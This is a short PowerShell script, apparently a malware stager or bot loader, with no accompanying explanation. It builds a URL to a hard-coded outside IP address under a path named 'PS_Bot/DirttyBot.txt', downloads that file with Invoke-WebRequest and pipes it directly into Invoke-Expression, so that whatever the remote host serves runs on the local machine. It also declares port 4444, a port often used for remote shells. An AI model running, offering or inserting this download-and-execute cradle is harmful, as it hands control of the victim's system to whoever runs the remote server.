$ip="34.213.170.51:80"
$port = "4444"
$command = "DirttyBot"  
$uri="http://"
$uri+=$ip;$uri+="/PS_Bot/";
$uri+=$command;
$uri+=".txt"
$uri
Invoke-WebRequest $uri -usebasicparsing | Invoke-Expression
$command